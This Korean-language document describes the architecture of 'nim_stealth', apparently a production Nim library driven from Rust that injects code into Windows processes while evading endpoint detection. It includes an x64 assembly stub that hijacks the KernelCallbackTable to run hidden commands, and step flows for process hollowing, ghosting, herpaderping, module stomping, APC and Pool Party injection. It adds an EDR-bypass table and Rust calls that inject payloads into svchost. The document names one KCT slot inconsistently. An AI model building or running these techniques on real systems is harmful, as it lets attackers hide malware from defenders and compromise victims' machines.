# nim_stealth 완전 분석 문서

> **목적**: Windows x64 타겟 프로세스에 대한 스텔스 인젝션·조작 기능을 Nim으로 구현하고, Rust(snaky_rust_win)에서 C FFI를 통해 호출하는 라이브러리.

---

## 목차

1. [전체 디렉토리 구조](#1-전체-디렉토리-구조)
2. [아키텍처 개요](#2-아키텍처-개요)
3. [Layer 1 — core/ (기반 엔진)](#3-layer-1--core-기반-엔진)
4. [Layer 2 — kct/ (KCT 하이재킹)](#4-layer-2--kct-kct-하이재킹)
5. [Layer 3 — injection/ (인젝션 기법)](#5-layer-3--injection-인젝션-기법)
6. [Layer 4 — libstealth.nim (FFI 진입점)](#6-layer-4--libstealth-ffi-진입점)
7. [tests/ — 테스트 코드](#7-tests--테스트-코드)
8. [기법별 원리 및 흐름](#8-기법별-원리-및-흐름)
9. [EDR 우회 전략 총정리](#9-edr-우회-전략-총정리)
10. [Rust에서 FFI 사용법](#10-rust에서-ffi-사용법)

---

## 1. 전체 디렉토리 구조

```
nim_stealth/
├── libstealth.nim          ← Rust FFI 익스포트 진입점 (DLL 최상위)
├── stealth.bin             ← 컴파일된 바이너리
│
├── core/                   ← 기반 엔진 (모든 모듈이 의존)
│   ├── resolver.nim        ← PEB 워킹 + API 해싱
│   ├── syscalls.nim        ← 간접 시스콜 + 스택 스푸퍼
│   ├── blinder.nim         ← ETW/AMSI 패치 (현재 비활성)
│   ├── masking.nim         ← EKKO 슬립 마스킹
│   ├── stealth_macros.nim  ← 컴파일타임 XOR 문자열 암호화
│   └── utils.nim           ← log_debug 스텁 (no-op)
│
├── kct/                    ← Kernel Callback Table 하이재킹
│   ├── kct_core.nim        ← KCT 읽기/쓰기/패치 기본 프리미티브
│   ├── kct_core_fiber.nim  ← kct_core 구버전 복사본
│   └── phantom_fiber_v4.nim← KCT Phantom Fiber v4 (프로덕션)
│
├── injection/              ← 각종 프로세스 인젝션 기법
│   ├── mapper.nim          ← Manual Map (반사적 DLL 인젝션)
│   ├── ghosting.nim        ← Process Ghosting
│   ├── hollowing.nim       ← Process Hollowing / RunPE
│   ├── stomping.nim        ← Module Stomping (Phantom Overloading)
│   ├── herpaderping.nim    ← Process Herpaderping
│   ├── phantom_fiber.nim   ← KCT Phantom Fiber v1 (구버전)
│   ├── poolparty.nim       ← Pool Party (TP_DIRECT)
│   └── threadless.nim      ← Early Bird APC + Special User APC
│
└── tests/
    ├── test_custom_process.nim  ← notepad.exe KCT 인젝션 테스트
    └── test_svchost.nim         ← svchost.exe KCT 인젝션 테스트
```

---

## 2. 아키텍처 개요

```
Rust (snaky_rust_win)
        │  C FFI (cdecl, dynlib)
        ▼
libstealth.nim          ← 단일 공개 API 레이어
        │
   ┌────┼────────────────┐
   ▼    ▼                ▼
core/ kct/          injection/
(기반)  (KCT 하이재킹)   (인젝션 기법들)
```

**설계 철학**:
- 모든 Windows API 호출은 `core/syscalls.nim`의 **간접 시스콜**로 처리
- 문자열은 `core/stealth_macros.nim`의 **컴파일타임 XOR 암호화**로 바이너리에서 숨김
- API 이름 해싱(`hash_api`)으로 IAT에 의심스러운 임포트가 남지 않음
- `log_debug`는 프로덕션에서 no-op → 아무 출력도 없음

---

## 3. Layer 1 — core/ (기반 엔진)

### 3.1 `resolver.nim` — PEB 워킹 + API 해싱

**핵심 역할**: `LoadLibraryA`/`GetProcAddress` 없이 메모리에서 직접 DLL 베이스와 함수 주소 획득.

#### 동작 원리

1. **PEB 획득**: 인라인 C 코드로 `__readgsqword(0x60)` (x64) 실행 → `_PEB` 포인터
2. **모듈 열거**: `PEB.Ldr.InLoadOrderModuleList` 연결 리스트를 순회
3. **이름 해싱**: `BaseDllName`을 djb2 해시(`hash * 33 + char`)로 비교 — 소문자 정규화 포함
4. **함수 검색**: 모듈의 Export Directory를 파싱, 이름→서수→RVA 방식으로 함수 주소 계산
5. **포워딩 처리**: 함수가 다른 DLL로 포워딩된 경우 재귀적으로 해결

```nim
macro H*(s: static string): uint32   # 컴파일타임 해싱
proc hash_api*(s: string): uint32    # 런타임 해싱
proc get_module_base*(module_hash: uint32): pointer
proc get_proc_address_hashed*(module_base: pointer, api_hash: uint32): pointer
proc get_proc_address_by_ordinal*(module: pointer, ordinal: uint32): pointer
```

**EDR 우회 포인트**: Import Address Table(IAT)에 `GetProcAddress`가 전혀 등장하지 않음.

---

### 3.2 `syscalls.nim` — 간접 시스콜 엔진

nim_stealth의 핵심. 모든 NT 함수 호출이 이 파일을 통과한다.

#### SSN(System Service Number) 획득 — Halo's Gate

```nim
proc get_ssn_from_disk_internal*(api_hash: uint32): uint32
```

1. 메모리 상의 `ntdll.dll` Export Table 파싱
2. 해당 함수 스텁에서 `4C 8B D1 B8 XX XX 00 00` 패턴 확인
   - `mov r10, rcx` + `mov eax, SSN` → SSN 직접 추출
3. **후킹 감지**: 스텁이 패치된 경우(훅 삽입됨) → Halo's Gate로 인접 함수에서 SSN 역산
   - 이웃 함수 ±32개 범위에서 깨끗한 스텁 탐색
   - `SSN = 이웃SSN ± delta`

#### `syscall; ret` 가젯 탐색

```nim
proc find_syscall_gadget_v2*(ntdll_base: pointer): pointer
# ntdll의 실행 가능 섹션을 바이트 스캔 → 0F 05 C3 위치 반환
```

#### 콜 스택 스푸퍼 — `spoofer_stub`

```nim
proc spoofer_stub*(func_ptr, gadget, arg1..arg11: pointer): uint64
```

`jmp rbx` 가젯(`FF E3`)을 kernel32/ntdll에서 탐색해 콜 체인에 삽입.
리턴 주소가 ntdll 내부처럼 보임 → EDR 스택 워크 우회.

#### 간접 시스콜 실행 흐름 (인라인 어셈블리)

```
do_indirect_syscall_impl(ssn, gadget, args[]):
  1. 레지스터 저장 (rbp, rsi, rdi, rbx)
  2. args[]에서 rcx, rdx, r8, r9 로드
  3. rsp 정렬 (sub 0x68 → 16바이트 정렬 보장)
  4. args[4..10]을 스택에 푸시
  5. mov eax, ssn
  6. call rbx (→ gadget의 syscall;ret 으로 점프)
```

**왜 "간접"인가?**: `call`이 ntdll 내부 `syscall` 명령으로 점프 → 콜 스택이 ntdll처럼 보임 → EDR의 스택 워크 우회

#### 구현된 NT 함수들

| 함수 | 용도 |
|------|------|
| `NtAllocateVirtualMemory` | 원격 메모리 할당 |
| `NtWriteVirtualMemory` | 원격 메모리 쓰기 |
| `NtReadVirtualMemory` | 원격 메모리 읽기 |
| `NtProtectVirtualMemory` | 메모리 보호 변경 |
| `NtFreeVirtualMemory` | 메모리 해제 |
| `NtCreateThreadEx` | 원격 스레드 생성 |
| `NtOpenProcess` | 프로세스 핸들 획득 |
| `NtGetContextThread` | 스레드 컨텍스트 읽기 |
| `NtSetContextThread` | 스레드 컨텍스트 덮어쓰기 |
| `NtCreateSection` | 섹션 오브젝트 생성 |
| `NtMapViewOfSection` | 섹션 뷰 매핑 |
| `NtCreateProcessEx` | 프로세스 생성 |
| `NtSuspendProcess` | 프로세스 일시정지 |
| `NtTerminateProcess` | 프로세스 종료 |
| `NtOpenFile` | 파일 핸들 획득 |

---

### 3.3 `stealth_macros.nim` — 컴파일타임 XOR 문자열 암호화

```nim
macro enc*(s: static string): untyped   # 컴파일 시점 XOR(key=0x42) → byte 배열
proc dec*(bytes: openArray[byte]): string  # 런타임 복호화
```

**적용 예시**:
```nim
const ENC_NTDLL = enc("ntdll.dll")  # 바이너리에 평문 없음
let ssn = get_ssn_from_disk_internal(dec(ENC_CREATETHREAD).hash_api)
```

---

### 3.4 `blinder.nim` — ETW/AMSI 패치 (현재 비활성)

설계: `EtwEventWrite`와 `AmsiScanBuffer` 첫 바이트를 `0xC3`(RET)으로 패치.
**현재 비활성**: 메모리 무결성 검사에 즉시 탐지됨. HWBP 방식으로 교체 예정.

### 3.5 `masking.nim` — EKKO 슬립 마스킹

슬립 중 자신의 메모리를 RC4(`SystemFunction032`)로 암호화하는 설계.
현재는 인프라(이벤트, 타이머 큐) 생성 후 단순 `Sleep(ms)`로 대체.

---

## 4. Layer 2 — kct/ (KCT 하이재킹)

### 4.1 KCT란?

**KernelCallbackTable(KCT)**는 `user32.dll` 로드 시 `PEB+0x58`에 설치되는 함수 포인터 배열.
Win32 커널이 유저모드 콜백(`__ClientXxx`)을 호출할 때 이 테이블을 참조.

```
PEB + 0x58 → KCT 포인터
KCT[0]  = __ClientAllocWindowClassExtraBytes
KCT[2]  = __ClientEventCallbackWorker  ← 주요 타겟
KCT[3]  = __ClientFindMnemChar
...
```

**하이재킹 원리**: KCT 슬롯을 악성 스텁 주소로 덮어쓰면, Win32 이벤트 처리 시 자동 실행.
**새 스레드 생성 없이** 기존 스레드에서 코드 실행 → EDR의 `NtCreateThreadEx` 훅 완전 우회.

---

### 4.2 `kct_core.nim` — KCT 기본 프리미티브

```nim
proc read_kct*(hProcess: HANDLE): pointer
# → NtQueryInformationProcess로 PEB 주소 획득
# → NtReadVirtualMemory(PEB + 0x58) → KCT 포인터

proc patch_kct*(hProcess, index, newFunc, oldFunc, cachedKct):
# → KCT[index] 주소 = KCT + index*8
# → NtReadVirtualMemory(원래 핸들러 저장)
# → NtProtectVirtualMemory(RW) → NtWriteVirtualMemory → 권한 복원

proc find_kct_index*(funcName: string): int
# → user32.dll Export의 __Client* 함수 목록에서 인덱스 탐색
```

---

### 4.3 `phantom_fiber_v4.nim` — 프로덕션 KCT 인젝션

**v1 대비 개선**:
- RWX 페이지 없음 → 스텁이 `MEM_MAPPED | PAGE_EXECUTE_READ` 섹션에 위치
- 디스크 흔적 없음 → pagefile-backed 익명 섹션
- Atomic one-shot gate → 중복 실행 완전 방지

#### KCTStubContext 구조체 (원격에 RW로 할당)

```nim
type KCTStubContext* = object
    gate*:        uint64   # +0x00  lock bts 원샷 플래그
    originalKct*: pointer  # +0x08  원래 KCT 핸들러 (JMP 대상)
    pWinExec*:    pointer  # +0x10  WinExec 함수 포인터
    cmdAddr*:     pointer  # +0x18  실행할 명령어 문자열
    stackBase*:   uint64   # +0x20  private 스택 상단
    stackLimit*:  uint64   # +0x28  private 스택 하단
```

#### x64 스텁 동작 흐름 (`kct_build_stub`)

```asm
; 1. 프롤로그: 레지스터+플래그 전부 저장
push rax; pushfq; push rcx,rdx,rbx; push r11,r14,r15

; 2. r11 = ctxAddr
mov r11, <ctxAddr>

; 3. Atomic one-shot gate (lock bts)
lock bts qword [r11+0], 0  ; CF=이전값
jc skip                     ; 이미 실행됐으면 건너뜀

; 4. TEB 스택 경계 교체
mov r14, gs:[0x08]          ; 원래 StackBase 저장 (r14)
mov r15, gs:[0x10]          ; 원래 StackLimit 저장 (r15)
mov rax, [r11+0x20]         ; ctx.stackBase
mov gs:[0x08], rax
mov rax, [r11+0x28]         ; ctx.stackLimit
mov gs:[0x10], rax

; 5. private 스택 전환
mov rbx, rsp
mov rsp, [r11+0x20]
sub rsp, 0x30

; 6. WinExec(cmd, SW_HIDE=0)
mov rcx, [r11+0x18]         ; cmdAddr
xor rdx, rdx
call [r11+0x10]             ; pWinExec

; 7. RSP 복원
add rsp, 0x30
mov rsp, rbx

; 8. TEB 스택 경계 복원
mov gs:[0x08], r14
mov gs:[0x10], r15

skip:
; 9. 에필로그: 레지스터 복원
pop r15,r14; pop r11; pop rbx,rdx,rcx; popfq; pop rax

; 10. 원래 KCT 핸들러로 JMP (투명 체이닝)
mov r11, <originalKctAddr>
jmp r11
```

#### Pagefile-backed 섹션 매핑 흐름 (`inject_phantom_fiber_v4`)

```
1. NtAllocateVirtualMemory(타겟, 64KB, RW) → ctxBase
   ├── ctxAddr    = ctxBase        (KCTStubContext)
   ├── cmdAddr    = ctxBase+0x1000 (명령어 문자열)
   ├── stackLimit = ctxBase+0x4000
   └── stackBase  = ctxBase+0xF800

2. read_kct(hProcess) → KCT 포인터
   NtReadVirtualMemory(KCT[index]) → original 핸들러

3. NtWriteVirtualMemory → 명령어 문자열 기록
4. NtWriteVirtualMemory → KCTStubContext 기록

5. kct_build_stub(ctxAddr, original) → 스텁 바이트 생성

6. kct_pagefile_map:
   NtCreateSection(NULL file, PAGE_EXECUTE_READWRITE, SEC_COMMIT)
   NtMapViewOfSection(로컬, PAGE_READWRITE) → localVA
   copyMem(localVA, 스텁)
   NtFreeVirtualMemory(로컬 뷰 해제)
   NtMapViewOfSection(타겟, PAGE_EXECUTE_READ) → remoteVA  ← RX만

7. patch_kct(index, remoteVA) → KCT[index] = 스텁 주소
```

---

## 5. Layer 3 — injection/ (인젝션 기법)

### 5.1 `hollowing.nim` — Process Hollowing (RunPE)

**개념**: 정상 프로세스를 Suspended 생성 → 원본 이미지 언맵 → 페이로드로 교체

```
CreateProcessA(target, CREATE_SUSPENDED)
NtGetContextThread → ctx.Rdx = PEB
NtReadVirtualMemory(PEB+0x10) → 원래 ImageBase
NtUnmapViewOfSection(원본 언맵)
NtAllocateVirtualMemory(payload 크기, RW)
NtWriteVirtualMemory(헤더 + 섹션)
재배치 적용 (IMAGE_BASE_RELOCATION, DIR64)
IAT 해결 (LoadLibraryA + GetProcAddress)
TLS 콜백 처리 → 실행 스텁 생성
섹션별 메모리 보호 적용
ctx.Rip = 엔트리포인트
NtSetContextThread → ResumeThread
```

---

### 5.2 `ghosting.nim` — Process Ghosting

**개념**: 삭제 예약된 파일에서 섹션 생성 → 파일이 사라져도 프로세스는 메모리에서 실행

```
CreateFileA(temp.tmp, SHARE_DELETE)
WriteFile(payload)
SetFileInformationByHandle(DELETE_ON_CLOSE)  ← 삭제 예약
NtCreateSection(SEC_IMAGE, hFile)            ← 예약 상태에서 섹션 생성
CloseHandle(hFile)                           ← 파일 즉시 삭제 (섹션은 유지)
NtCreateProcessEx(섹션 기반)
RtlCreateProcessParametersEx → PEB에 링크
NtCreateThreadEx(SUSPENDED) → LDR Spoofing → ResumeThread
```

**EDR 우회**: 디스크에서 PE 읽으려 할 때 파일 없음.

---

### 5.3 `herpaderping.nim` — Process Herpaderping

**개념**: Ghosting 변형. 섹션 매핑 후 디스크 파일을 정상 파일로 덮어씀.

```
CreateFileA(WinUpdate_<seed>\svchost.exe)
WriteFile(악성 payload)
NtCreateSection(SEC_IMAGE, hFile)      ← 커널에 악성 이미지 고정
ReadFile(notepad.exe)
WriteFile(hFile, notepad 내용)         ← 디스크 파일 교체
SetEndOfFile
CloseHandle(hFile)
NtCreateProcessEx(악성 섹션 기반)     ← 디스크=정상, 메모리=악성
```

---

### 5.4 `mapper.nim` — Manual Map

**개념**: PE 로더를 직접 구현해 DLL을 타겟 프로세스에 수동 로드.

```
페이로드 파싱 (DOS/NT 헤더)
NtAllocateVirtualMemory (stomp=true면 희생 모듈 위치 재사용)
헤더 + 섹션 복사
재배치 처리 (delta = actual - preferred)
IAT 해결 (PEB에서 LoadLibraryA/GetProcAddress 탐색)
섹션별 보호 적용
DllMain 호출 스텁 생성 후 주입
```

`stomp=true`: 기존 모듈 메모리에 덮어씀 → `MEM_MAPPED` 영역으로 위장.

---

### 5.5 `stomping.nim` — Module Stomping (Phantom Overloading)

```
CreateProcessA(target, SUSPENDED)
NtCreateSection(SEC_IMAGE, amsi.dll or shell32.dll)  ← 합법적 DLL
NtMapViewOfSection(타겟) → remoteBase                ← 합법적으로 매핑
NtProtectVirtualMemory(RW)
NtWriteVirtualMemory(payload 덮어씀)
재배치 + IAT + TLS + 보호 적용
ctx.Rcx = 엔트리포인트
NtSetContextThread → ResumeThread
```

**EDR 우회**: 메모리 영역이 `MEM_MAPPED`로 표시 → 정상 로드된 모듈처럼 보임.

---

### 5.6 `threadless.nim` — Early Bird APC + Special User APC

#### Early Bird APC (`run_early_bird`)

```
CreateProcessA(target, SUSPENDED)
페이로드 로드 + IAT 해결
APC 트램폴린 스텁: sub rsp,0x28 / call EntryPoint / add rsp,0x28 / ret
QueueUserAPC(트램폴린, pi.hThread)
ResumeThread → alertable 진입 시 APC 실행
```

#### Special User APC (`run_special_user_apc`)

`NtQueueApcThreadEx`에 `SPECIAL_USER_APC(=1)` 플래그 → alertable 불필요, 즉시 실행.

---

### 5.7 `poolparty.nim` — Pool Party (TP_DIRECT)

```
NtQuerySystemInformation → 타겟 PID의 모든 핸들 열거
IoCompletion + WorkerFactory 핸들 쌍 탐색 (핸들값 거리 최소화)
NtDuplicateObject(로컬에 복사)
TP_DIRECT { Callback = shellcode } 원격 할당
NtSetIoCompletion(iocp, TP_DIRECT)     ← 작업 패킷 등록
NtSetInformationWorkerFactory(MinThreads=1)  ← 워커 트리거
```

---

## 6. Layer 4 — libstealth (FFI 진입점)

| 함수명 | 역할 |
|--------|------|
| `InitStealthEngine()` | 엔진 초기화 |
| `StealthGetHandle(pid)` | NtOpenProcess |
| `StealthAllocate(hProc, size, protect)` | NtAllocateVirtualMemory |
| `StealthWrite(hProc, base, buf, size)` | NtWriteVirtualMemory |
| `StealthProtect(hProc, base, size, prot)` | NtProtectVirtualMemory |
| `StealthFree(hProc, base)` | NtFreeVirtualMemory |
| `StealthCreateThread(hProc, routine, arg)` | NtCreateThreadEx |
| `StealthCreateThreadEx(..., spoof)` | 스택 스푸핑 옵션 포함 |
| `StealthGetContext / StealthSetContext` | 스레드 컨텍스트 읽기/쓰기 |
| `StealthSleep(ms)` | EKKO 마스킹 슬립 |
| `StealthCrash(pid)` | NtSuspendProcess |
| `StealthKill(pid)` | NtTerminateProcess(0xDEADBEEF) |
| `StealthManualMap(hProc, buf)` | Manual Map |
| `StealthManualMapEx(hProc, buf, stomp)` | Module Stomping 옵션 |
| `StealthGhostProcess(payload, size, cmd)` | Process Ghosting |
| `StealthHollowProcess(payload, size, target)` | Process Hollowing |
| `StealthModuleStomping(payload, size, target)` | Module Stomping |
| `StealthFindFirstThread(pid)` | Toolhelp32 TID 탐색 |
| `StealthHijackThread(tid, entry)` | 스레드 컨텍스트 하이재킹 |
| `StealthInjectShellcode(hProc, sc, size)` | 셸코드 인젝션 |
| `StealthKCTInject(hProc, index, cmd)` | KCT Phantom Fiber v4 |
| `StealthKCTAutoInject(hProc, cmd)` | 슬롯 2→3→1→4 자동 시도 |

---

## 7. tests/ — 테스트 코드

### `test_custom_process.nim`

notepad.exe 실행 후 PID 탐색 → KCT 슬롯 2에 Phantom Fiber v4 인젝션.
성공 시 `kct_test_success.txt` 생성으로 결과 확인.

### `test_svchost.nim`

모든 svchost.exe 인스턴스에 순서대로 인젝션 시도. 첫 성공 시 break.

---

## 8. 기법별 원리 및 흐름

### KCT 인젝션 트리거 메커니즘

```
타겟 프로세스 Win32 메시지 처리
    ↓
커널이 KCT[2] 호출
    ↓
악성 스텁 실행 (pagefile 섹션, RX)
    ↓
atomic gate (중복 실행 방지)
    ↓
TEB 스택 경계 교체 → private 스택
    ↓
WinExec(command)
    ↓
스택/TEB 복원 → 원래 핸들러 JMP
```

---

## 9. EDR 우회 전략 총정리

| 우회 대상 | 기법 | 구현 위치 |
|-----------|------|-----------|
| IAT 분석 | API 해싱 + PEB 워킹 | `resolver.nim` |
| 시스콜 훅 | 간접 시스콜 + Halo's Gate | `syscalls.nim` |
| 스택 워크 | 콜 스택 스푸퍼 (`jmp rbx`) | `syscalls.nim` |
| 문자열 스캔 | XOR 컴파일타임 암호화 | `stealth_macros.nim` |
| 메모리 스캔 | RWX 없음 (MEM_MAPPED RX) | `phantom_fiber_v4.nim` |
| 새 스레드 탐지 | KCT 하이재킹 (스레드 생성 없음) | `kct/` |
| 디스크 스캔 (1) | 파일 삭제 후 실행 | `ghosting.nim` |
| 디스크 스캔 (2) | 디스크 덮어쓰기 | `herpaderping.nim` |
| ETW 텔레메트리 | ETW 패치 (HWBP 예정) | `blinder.nim` |
| 메모리 스캔 중 슬립 | EKKO 마스킹 (미완성) | `masking.nim` |
| 중복 실행 | Atomic one-shot gate | `phantom_fiber_v4.nim` |

---

## 10. Rust에서 FFI 사용법

### 바인딩 선언 예시

```rust
use std::ffi::CString;

#[link(name = "stealth", kind = "dylib")]
extern "C" {
    fn InitStealthEngine() -> i32;
    fn StealthGetHandle(pid: u32) -> isize;
    fn StealthKCTAutoInject(h_process: isize, command: *const i8) -> bool;
    fn StealthKCTInject(h_process: isize, index: i32, command: *const i8) -> bool;
    fn StealthAllocate(h_process: isize, size: usize, protect: u32) -> *mut std::ffi::c_void;
    fn StealthWrite(h_process: isize, base: *mut std::ffi::c_void, buf: *const std::ffi::c_void, size: usize) -> i32;
    fn StealthInjectShellcode(h_process: isize, shellcode: *const std::ffi::c_void, size: i32) -> bool;
    fn StealthKill(pid: u32) -> i32;
    fn StealthSleep(ms: u32);
}
```

### KCT 자동 인젝션

```rust
unsafe {
    InitStealthEngine();
    let h_process = StealthGetHandle(target_pid);
    if h_process == 0 { return; }
    let cmd = CString::new("cmd.exe /c calc.exe").unwrap();
    let ok = StealthKCTAutoInject(h_process, cmd.as_ptr());
    // ok == true 이면 성공
}
```

### Process Hollowing

```rust
unsafe {
    let payload = std::fs::read("payload.exe").unwrap();
    let target = CString::new("C:\\Windows\\System32\\svchost.exe").unwrap();
    let h = StealthHollowProcess(
        payload.as_ptr() as *const _,
        payload.len() as i32,
        target.as_ptr()
    );
}
```

---

## 부록: 주요 상수 및 오프셋

| 항목 | 값 | 설명 |
|------|----|------|
| PEB.KernelCallbackTable | +0x58 | KCT 포인터 위치 |
| PEB.ImageBaseAddress | +0x10 | 프로세스 이미지 베이스 |
| PEB.ProcessParameters | +0x20 | RTL_USER_PROCESS_PARAMETERS |
| PEB.Ldr | +0x18 | PEB_LDR_DATA 포인터 |
| XOR 암호화 키 | 0x42 | `stealth_macros.nim` |
| KCT 기본 타겟 슬롯 | 2 | NlsDispatchAnsiEnumerateCodePage |
| NT 시스콜 스텁 패턴 | `4C 8B D1 B8` | `mov r10,rcx; mov eax,SSN` |
| syscall 가젯 패턴 | `0F 05 C3` | `syscall; ret` |
| 스펙 스푸퍼 가젯 | `FF E3` | `jmp rbx` |
